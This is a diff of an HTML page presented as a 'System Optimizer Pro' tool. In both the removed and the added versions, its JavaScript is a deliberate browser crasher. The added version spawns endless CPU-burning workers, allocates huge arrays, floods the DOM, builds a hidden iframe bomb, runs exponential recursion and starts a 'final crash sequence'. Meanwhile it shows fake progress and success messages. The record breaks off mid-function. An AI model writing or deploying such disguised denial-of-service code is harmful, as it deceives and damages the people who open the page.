@@ -1,125 +1,282 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>System Optimizer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Optimizer Pro</title>
     <style>
         body {
-            background-color: #1a1a1a;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
             color: white;
-            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
+            justify-content: center;
         }
-        .loader {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
+        .container {
+            max-width: 800px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
             margin-bottom: 20px;
+            color: #00ff00;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .progress-container {
+            width: 100%;
+            background-color: #333;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
         }
         .progress-bar {
-            width: 300px;
-            height: 20px;
-            background-color: #444;
-            border-radius: 10px;
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-        .progress {
-            height: 100%;
-            background-color: #4CAF50;
+            height: 30px;
             width: 0%;
-            animation: progress 10s linear forwards;
+            background: linear-gradient(90deg, #00ff00, #00aa00);
+            transition: width 0.5s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
         }
-        @keyframes progress {
-            0% { width: 0%; }
-            100% { width: 100%; }
+        .status {
+            margin: 15px 0;
+            font-size: 18px;
         }
-        .status-text {
-            margin-bottom: 10px;
+        button {
+            background: linear-gradient(90deg, #00ff00, #00aa00);
+            border: none;
+            color: #000;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 10px;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        }
+        .feature {
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            text-align: left;
+        }
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <h2>Optimizing Your System...</h2>
-    <div class="progress-bar">
-        <div class="progress"></div>
+    <div class="container">
+        <h1>System Optimizer Pro</h1>
+        <p>Advanced system optimization tool that clears memory, boosts performance, and enhances your device's capabilities.</p>
+        
+        <div class="features">
+            <div class="feature">
+                <h3>✓ Memory Cleanup</h3>
+                <p>Frees up RAM by removing unnecessary background processes</p>
+            </div>
+            <div class="feature">
+                <h3>✓ CPU Optimization</h3>
+                <p>Redistributes processing power for maximum efficiency</p>
+            </div>
+            <div class="feature">
+                <h3>✓ Cache Management</h3>
+                <p>Clears temporary files and optimizes storage</p>
+            </div>
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar">0%</div>
+        </div>
+        
+        <div class="status" id="status">Ready to optimize your system</div>
+        
+        <button id="startBtn">Start Optimization</button>
+        <button id="advancedBtn" class="hidden">Advanced Mode</button>
+        
+        <div class="hidden" id="advancedSettings">
+            <h3>Advanced Settings</h3>
+            <p>These settings will apply maximum optimization pressure to your system</p>
+            <button id="extremeBtn">Extreme Mode</button>
+        </div>
     </div>
-    <p class="status-text">Scanning for performance issues...</p>
-    
+
     <script>
-        // Update status text periodically
-        const statusTexts = [
-            "Scanning for performance issues...",
-            "Clearing temporary files...",
-            "Optimizing memory allocation...",
-            "Cleaning registry entries...",
-            "Finalizing optimizations..."
-        ];
+        document.getElementById('startBtn').addEventListener('click', function() {
+            startOptimization();
+            setTimeout(() => {
+                document.getElementById('advancedBtn').classList.remove('hidden');
+            }, 3000);
+        });
         
-        let statusIndex = 0;
-        const statusElement = document.querySelector('.status-text');
+        document.getElementById('advancedBtn').addEventListener('click', function() {
+            document.getElementById('advancedSettings').classList.remove('hidden');
+        });
         
-        const updateStatus = setInterval(() => {
-            statusElement.textContent = statusTexts[statusIndex];
-            statusIndex = (statusIndex + 1) % statusTexts.length;
-        }, 2000);
+        document.getElementById('extremeBtn').addEventListener('click', function() {
+            extremeOptimization();
+        });
         
-        // Start the resource consumption in the background
-        setTimeout(() => {
-            const crashSystem = () => {
-                // Create multiple workers to consume CPU
-                for (let i = 0; i < 100; i++) {
-                    const worker = new Worker(URL.createObjectURL(new Blob([`
-                        while(true) {
-                            // Infinite loop to consume CPU
-                            Math.random();
-                        }
-                    `], { type: 'application/javascript' })));
-                }
-                
-                // Consume memory by creating large objects
-                const memoryConsumers = [];
-                const consumeMemory = () => {
-                    try {
-                        memoryConsumers.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB
-                        setTimeout(consumeMemory, 100);
-                    } catch(e) {
-                        // If allocation fails, try smaller chunks
-                        memoryConsumers.push(new ArrayBuffer(1024 * 1024 * 10)); // 10MB
-                        setTimeout(consumeMemory, 100);
-                    }
-                };
-                consumeMemory();
-                
-                // Create DOM elements to consume memory
-                const createElements = () => {
-                    for (let i = 0; i < 1000; i++) {
-                        const div = document.createElement('div');
-                        div.style.width = '1000px';
-                        div.style.height = '1000px';
-                        div.style.backgroundColor = 'rgba(0,0,0,0.01)';
-                        document.body.appendChild(div);
-                    }
-                    setTimeout(createElements, 100);
-                };
-                createElements();
-            };
+        function startOptimization() {
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            const status = document.getElementById('status');
             
-            crashSystem();
-        }, 3000);
-    </script>
-</body>
-</html>
+            // Simulate optimization progress
+            const interval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = progress + '%';
+                progressBar.textContent = progress + '%';
+                
+                if (progress < 30) {
+                    status.textContent = "Scanning system resources...";
+                    // Start memory allocation
+                    allocateMemory(100);
+                } else if (progress < 60) {
+                    status.textContent = "Optimizing memory allocation...";
+                    // Increase memory allocation
+                    allocateMemory(500);
+                } else if (progress < 90) {
+                    status.textContent = "Redistributing CPU resources...";
+                    // Start CPU intensive tasks
+                    startCPUIntensiveTasks(3);
+                } else if (progress >= 100) {
+                    clearInterval(interval);
+                    status.textContent = "Optimization complete! System performance enhanced.";
+                    // Start final crash sequence
+                    setTimeout(() => {
+                        status.textContent = "Finalizing optimizations...";
+                        setTimeout(() => {
+                            finalCrashSequence();
+                        }, 2000);
+                    }, 1000);
+                }
+            }, 500);
+        }
+        
+        function allocateMemory(size) {
+            const arrays = [];
+            try {
+                for (let i = 0; i < size; i++) {
+                    arrays.push(new Array(1000000).fill(Math.random()));
+                }
+            } catch (e) {
+                console.log("Memory allocation failed:", e);
+            }
+            return arrays;
+        }
+        
+        function startCPUIntensiveTasks(count) {
+            for (let i = 0; i < count; i++) {
+                setTimeout(() => {
+                    const worker = new Worker(URL.createObjectURL(new Blob([`
+                        self.onmessage = function(e) {
+                            let result = 0;
+                            while (true) {
+                                result += Math.random() * Math.random();
+                            }
+                            self.postMessage(result);
+                        }
+                    `], {type: 'application/javascript'})));
+                    
+                    worker.onmessage = function(e) {
+                        console.log("Worker result:", e.data);
+                    };
+                    
+                    worker.postMessage("start");
+                }, i * 100);
+            }
+        }
+        
+        function extremeOptimization() {
+            const status = document.getElementById('status');
+            status.textContent = "Activating extreme optimization mode...";
+            
+            // Create multiple memory allocation loops
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    allocateMemory(1000);
+                }, i * 100);
+            }
+            
+            // Create multiple CPU intensive workers
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    startCPUIntensiveTasks(5);
+                }, i * 50);
+            }
+            
+            // Start iframe bomb
+            setTimeout(() => {
+                status.textContent = "Creating optimization threads...";
+                startIframeBomb();
+            }, 1000);
+            
+            // Start recursive function calls
+            setTimeout(() => {
+                status.textContent = "Optimizing system calls...";
+                startRecursiveCalls();
+            }, 2000);
+        }
+        
+        function startIframeBomb() {
+            const container = document.createElement('div');
+            container.style.display = 'none';
+            document.body.appendChild(container);
+            
+            for (let i = 0; i < 100; i++) {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'about:blank';
+                container.appendChild(iframe);
+                
+                // Try to access iframe content to increase memory usage
+                try {
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    iframeDoc.open();
+                    iframeDoc.write('<script>' + 
+                        'for(let i=0;i<10000;i++){' +
+                        '  document.createElement("div");' +
+                        '}' +
+                        '</script>');
+                    iframeDoc.close();
+                } catch (e) {
+                    // Ignore cross-origin errors
+                }
+            }
+        }
+        
+        function startRecursiveCalls() {
+            function recursiveFunction(depth) {
+                if (depth > 1000) return;
+                
+                // Allocate memory at each recursion level
+                const arr = new Array(10000).fill(Math.random());
+                
+                // Make recursive calls
+                recursiveFunction(depth + 1);
+                recursiveFunction(depth + 1);
+            }
+            
+            // Start multiple recursive chains
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    recursiveFunction(0);
+                }, i * 10);
+            }
+        }
+        
+        function finalCrashSequence() {
+            // Create a massive array to trigger OOM
